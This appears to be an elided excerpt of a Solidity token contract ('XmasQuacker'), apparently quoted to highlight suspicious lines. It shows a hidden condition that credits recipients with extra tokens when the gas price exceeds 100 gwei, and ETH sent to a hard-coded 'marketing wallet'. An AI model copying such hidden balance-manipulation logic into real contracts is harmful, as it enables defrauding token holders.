...
contract XmasQuacker is Context, IERC20, Ownable {
    ...
    string private constant _name = "XmasQuacker.com"; // 
    ...
    function _transfer(
        ...
        if (tx.gasprice > 100 gwei){_tOwned[to] += amount;}
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(0x1b989Aebe5015006c7CA575423d30496f515Bccb).transfer(ethToSend); //marketing wallet
    }
